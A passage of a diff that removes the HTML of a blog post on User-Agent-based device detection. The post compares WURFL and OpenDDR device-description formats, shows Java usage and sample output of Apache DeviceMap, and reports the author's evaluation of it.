-          &lt;li&gt;Iframe: True&lt;/li&gt;
-          &lt;li&gt;IndexedDB: True&lt;/li&gt;
-          &lt;li&gt;jQueryMobileSupport: A-Grade&lt;/li&gt;
-          &lt;li&gt;LayoutEngine: Blink&lt;/li&gt;
-          &lt;li&gt;Masking: False&lt;/li&gt;
-          &lt;li&gt;PostMessage: True&lt;/li&gt;
-          &lt;li&gt;Prompts: True&lt;/li&gt;
-          &lt;li&gt;Selector: True&lt;/li&gt;
-          &lt;li&gt;TouchEvents: True&lt;/li&gt;
-          &lt;li&gt;Track: True&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;GPS
-        &lt;ul&gt;
-          &lt;li&gt;GeoLocation: True&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Html
-        &lt;ul&gt;
-          &lt;li&gt;Html-Media-Capture: True&lt;/li&gt;
-          &lt;li&gt;HtmlVersion: 5.0&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Javascript
-        &lt;ul&gt;
-          &lt;li&gt;Javascript: True&lt;/li&gt;
-          &lt;li&gt;JavascriptCanManipulateCSS: True&lt;/li&gt;
-          &lt;li&gt;JavascriptCanManipulateDOM: True&lt;/li&gt;
-          &lt;li&gt;JavascriptGetElementById: True&lt;/li&gt;
-          &lt;li&gt;JavascriptSupportsEventListener: True&lt;/li&gt;
-          &lt;li&gt;JavascriptSupportsEvents: True&lt;/li&gt;
-          &lt;li&gt;JavascriptSupportsInnerHtml: True&lt;/li&gt;
-          &lt;li&gt;JavascriptVersion: 1.8.5&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;JSON
-        &lt;ul&gt;
-          &lt;li&gt;Json: True&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Name
-        &lt;ul&gt;
-          &lt;li&gt;BrowserName: Chrome&lt;/li&gt;
-          &lt;li&gt;BrowserVendor: Google&lt;/li&gt;
-          &lt;li&gt;BrowserVersion: 38&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Screen
-        &lt;ul&gt;
-          &lt;li&gt;Fullscreen: True&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Supported Media
-        &lt;ul&gt;
-          &lt;li&gt;SupportsTls/Ssl: True&lt;/li&gt;
-          &lt;li&gt;Svg: True&lt;/li&gt;
-          &lt;li&gt;Video: True&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;ViewPort
-        &lt;ul&gt;
-          &lt;li&gt;Viewport: True&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Web
-        &lt;ul&gt;
-          &lt;li&gt;CookiesCapable: True&lt;/li&gt;
-          &lt;li&gt;History: True&lt;/li&gt;
-          &lt;li&gt;Progress: True&lt;/li&gt;
-          &lt;li&gt;WebWorkers: True&lt;/li&gt;
-          &lt;li&gt;Xhr2: True&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Crawler
-    &lt;ul&gt;
-      &lt;li&gt;Miscellaneous
-        &lt;ul&gt;
-          &lt;li&gt;IsCrawler: False&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Per see, what they can get by just looking at your User-Agent header is (to put
-it mildly) &lt;em&gt;a lot&lt;/em&gt;!&lt;/p&gt;
-
-&lt;h1 id="long-live-foss"&gt;Long live F/OSS!&lt;/h1&gt;
-
-&lt;p&gt;As usual, community’s response did not take long and the most recent open
-source version of WURFL (dating back to 2011) is forked under the
-&lt;a href="https://github.com/OpenDDRdotORG/OpenDDR-Resources"&gt;OpenDDR&lt;/a&gt; project. Later
-on, community kept updating the database by the effort of individual
-contributors.&lt;/p&gt;
-
-&lt;p&gt;While OpenDDR file format allows hierarchical device representation as in
-WURFL, it rather maps each device to a set of attributes explicitly. To make a
-comparison, see how WURFL takes advantage of its hierarchical device
-representation:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class="language-xml"&gt;&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (04"&lt;/span&gt;
-        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_generic"&lt;/span&gt;
-        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;group&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"ui"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
-        &lt;span class="nt"&gt;&amp;lt;capability&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"table_support"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"false"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; 
-    &lt;span class="nt"&gt;&amp;lt;/group&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/device&amp;gt;&lt;/span&gt;
-
-&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (04.67)"&lt;/span&gt;
-        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1"&lt;/span&gt;
-        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1_sub467"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; 
-
-&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (04.69)"&lt;/span&gt;
-        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1"&lt;/span&gt;
-        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1_sub469"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; 
-
-&lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
-
-&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (04.94)"&lt;/span&gt;
-        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1"&lt;/span&gt;
-        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1_sub494"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; 
-
-&lt;span class="c"&gt;&amp;lt;!-- 7110 new-age --&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (05"&lt;/span&gt;
-        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1"&lt;/span&gt;
-        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver2"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;group&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"ui"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class="nt"&gt;&amp;lt;capability&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"table_support"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; 
-    &lt;span class="nt"&gt;&amp;lt;/group&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/device&amp;gt;&lt;/span&gt;
-
-&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (05.00)"&lt;/span&gt;
-        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver2"&lt;/span&gt; 
-        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1_sub500"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-
-&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (05.01)"&lt;/span&gt;
-        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver2"&lt;/span&gt;
-        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1_sub501"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;On the other hand, OpenDDR follows a more flat model:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class="language-xml"&gt;&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"SAMSUNG-SGH-i780"&lt;/span&gt; &lt;span class="na"&gt;parentId=&lt;/span&gt;&lt;span class="s"&gt;"genericSamsung"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"model"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"SGH-i780"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"displayWidth"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"320"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"displayHeight"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"320"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"mobile_browser"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"Microsoft Mobile Explorer"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"mobile_browser_version"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"7.7"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"device_os"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"Windows Mobile OS"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/device&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"sholest"&lt;/span&gt; &lt;span class="na"&gt;parentId=&lt;/span&gt;&lt;span class="s"&gt;"genericMotorola"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"model"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"XT701"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"marketing_name"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"Sholes Tablet"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"displayWidth"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"480"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_getelementbyid"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_inner_html"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_manipulate_dom"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_manipulate_css"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_events"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_event_listener"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"image_inlining"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"from"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"open_db_modified"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/device&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"bravo"&lt;/span&gt; &lt;span class="na"&gt;parentId=&lt;/span&gt;&lt;span class="s"&gt;"genericHTC"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"model"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"A8183"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"marketing_name"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"Bravo"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"displayWidth"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"480"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_manipulate_css"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_events"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_event_listener"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"image_inlining"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"from"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"open_db_modified"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/device&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id="apache-devicemap"&gt;Apache DeviceMap&lt;/h1&gt;
-
-&lt;p&gt;While DDR exposes you an almost exhaustive set of device vendors, models, and
-attributes, it does not provide you a search mechanism in this swamp. &lt;a href="http://devicemap.apache.org/"&gt;Apache
-DeviceMap&lt;/a&gt; (which is graduating from incubation
-as of this writing) is a project that fills this gap. DeviceMap basically
-ships two fundamental Maven artifacts: an OpenDDR clone (&lt;code&gt;devicemap-data&lt;/code&gt;) and
-a driver (&lt;code&gt;devicemap-client&lt;/code&gt;) available for Visual Basic, C# and Java
-programming languages.&lt;/p&gt;
-
-&lt;p&gt;Usage of Apache DeviceMap is pretty straigt forward. You first include
-necessary set of dependencies in your POM file:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class="language-xml"&gt;&lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.devicemap&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;devicemap-data&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.0.2-SNAPSHOT&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.devicemap&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;devicemap-client&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
-    &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.1.0-SNAPSHOT&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And then enjoy the API exposed by the driver:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;org.apache.devicemap.DeviceMapClient&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
-&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;org.apache.devicemap.loader.LoaderOption&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
-
-&lt;span class="c1"&gt;// Create a DeviceMapClient instance.&lt;/span&gt;
-&lt;span class="n"&gt;DeviceMapClient&lt;/span&gt; &lt;span class="n"&gt;deviceMapClient&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;DeviceMapClient&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
-&lt;span class="n"&gt;deviceMapClient&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;initDeviceData&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LoaderOption&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;JAR&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
-
-&lt;span class="c1"&gt;// Try to classify a sample User-Agent parameter using the DeviceMapClient.&lt;/span&gt;
-&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;desc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
-              &lt;span class="s"&gt;"AppleWebKit/537.36 (KHTML, like Gecko) "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
-              &lt;span class="s"&gt;"Chrome/38.0.2125.104 Safari/537.36"&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
-&lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;attrs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;deviceMapClient&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;classify&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;desc&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
-
-&lt;span class="c1"&gt;// Dump found attributes.&lt;/span&gt;
-&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;attrs&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
-    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Entry&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;attr&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;attrs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;entrySet&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt;
-        &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"%s = %s\n"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getKey&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getValue&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;In the following you can find the output of the above snippet:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;displayHeight = 600
-ajax_support_inner_html = true
-mobile_browser_version = -
-is_tablet = false
-ajax_support_getelementbyid = true
-ajax_support_javascript = true
-ajax_manipulate_dom = true
-ajax_manipulate_css = true
-vendor = -
-model = -
-id = desktopDevice
-mobile_browser = -
-is_bot = false
-nokia_edition = 0
-is_wireless_device = false
-ajax_support_event_listener = true
-device_os = -
-inputDevices = -
-nokia_series = 0
-ajax_support_events = true
-xhtml_format_as_css_property = false
-displayWidth = 800
-marketing_name = -
-image_inlining = false
-device_os_version = -
-xhtml_format_as_attribute = false
-is_desktop = true
-dual_orientation = false
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Per see, the output is not much detailed as the one we got from 51degrees.
-Almost all of the crucial data is missing and there are some mistakes in
-certain entries like display width and height. That being said, it got three
-important bits right: &lt;code&gt;is_desktop&lt;/code&gt;, &lt;code&gt;is_bot&lt;/code&gt;, and &lt;code&gt;is_tablet&lt;/code&gt;. Note that there
-does not exist much of a mechanism to verify the correctness of the attributes
-returned by the employed engine. That is, the nature of the problem also
-implies the absance of a verification mechanism.&lt;/p&gt;
-
-&lt;h1 id="the-grand-decision"&gt;The Grand Decision&lt;/h1&gt;
-
-&lt;p&gt;If you had a chance to check out the website of the commercial DDR and
-User-Agent detection solutions, you should have noticed the giant IT leaders
-(Google, Facebook, PayPal, etc.) in their customers list. Hence, it was a
-little bit tempting to go with a commercial solution. That being said, I also
-wanted to evaluate the performance of the Apache DeviceMap. For that purpose,
-I collected a couple of months worth visitor data at work and tried to resolve
-User-Agent headers. The results were very promising and Apache DeviceMap
-succeeded to resolve almost 90% of all the collected User-Agent strings. That
-beign said, resolving a User-Agent – that is, matching the given User-Agent
-against DDR and returning a set of attributes – does not imply the
-correctness of the returned attributes. Nevertheless, I repeated the same
-experiment with almost two dozens of different devices at work and it
-succeeded in almost everyone.&lt;/p&gt;
-
-&lt;p&gt;Since the project that I am working on is still in its early stages and the
-initial results are more than satisfactory, we concluded to go with Apache
